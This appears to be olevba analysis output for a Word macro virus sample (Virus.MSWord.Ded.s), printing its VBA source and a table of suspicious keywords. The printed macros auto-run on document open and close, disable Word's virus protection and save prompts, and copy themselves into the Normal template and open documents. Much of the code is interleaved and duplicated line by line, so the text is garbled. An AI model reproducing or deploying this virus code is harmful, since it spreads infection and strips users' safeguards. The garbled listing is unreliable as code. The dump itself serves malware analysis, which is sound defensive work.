olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.s-c5e189109ee13ba7eb31cf82a08a9ce6fed2cd8c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.s-c5e189109ee13ba7eb31cf82a08a9ce6fed2cd8c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
()
On Error Resume Next
 ()
On Error Resume Next
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.EnableCancelKey = wdCancelDisabled
With Options:
Application.EnableCancelKey = wdCancelDisabled
With Options:
With Options:
    .ConfirmConversions = False:
With Options:
    .ConfirmConversions = False:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SavePropertiesPrompt = False:
End With
    .SavePropertiesPrompt = False:
End With
End With
s = ActiveDocument.Saved
End With
s = ActiveDocument.Saved
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sFunc = "Private Sub Document_Open()"
Found = False
sFunc = "Private Sub Document_Open()"
Found = False
Found = False
If Dir(sName) <> "" Then Kill sName
Found = False
If Dir(sName) <> "" Then Kill sName
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Open sName For Output As #1
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Found = False And (a = sFunc) Then Found = True
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If a <> "" And Found = True Then Print #1, a
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If a = "End Sub" And Found = True Then Found = False
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Next i
    If Found = False And (a = sFunc) Then Found = True
Close #1
    If Found = False And (a = sFunc) Then Found = True
j = 1
    If a <> "" And Found = True Then Print #1, a
k = 1
    If a <> "" And Found = True Then Print #1, a
t = 0
    If a = "End Sub" And Found = True Then Found = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    If a = "End Sub" And Found = True Then Found = False
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
Next i
    t = t + 1
Next i
End If
Close #1
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
Close #1
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
j = 1
    t = t + 2
j = 1
End If
k = 1
If t > 0 Then
k = 1
    Open sName For Input As #1
t = 0
    If LOF(1) = 0 Then GoTo quit
t = 0
    i = 1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Do While Not EOF(1)
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
        Line Input #1, a
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
        If t = 1 Or t = 3 Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
            nml.CodeModule.InsertLines j, a
    t = t + 1
            j = j + 1
    t = t + 1
        End If
End If
        If t = 2 Or t = 3 Then
End If
            atv.CodeModule.InsertLines k, a
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
            k = k + 1
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
        End If
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    Loop
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
quit:
    t = t + 2
    Close #1
    t = t + 2
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
End If
    .Title = "Ethan Frome":
If t > 0 Then
    .Author = "EW/LN/CB":
If t > 0 Then
    .Keywrds = "Ethan":
    Open sName For Input As #1
    .Execute:
    Open sName For Input As #1
End With
    If LOF(1) = 0 Then GoTo quit
If Left(ActiveDocument.Name, 8) <> "Document" Then
    If LOF(1) = 0 Then GoTo quit
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    i = 1
End If
    i = 1
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Do While Not EOF(1)
Kill sName
    Do While Not EOF(1)
Application.EnableCancelKey = wdCancelInterrupt
        Line Input #1, a
End Sub
        Line Input #1, a
        If t = 1 Or t = 3 Then
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            nml.CodeModule.InsertLines j, a
            j = j + 1
            j = j + 1
        End If
        End If
        If t = 2 Or t = 3 Then
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            atv.CodeModule.InsertLines k, a
            k = k + 1
            k = k + 1
        End If
        End If
    Loop
    Loop
quit:
quit:
    Close #1
    Close #1
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Keywrds = "Ethan":
    .Execute:
    .Execute:
End With
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
Application.EnableCancelKey = wdCancelInterrupt
End Sub
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

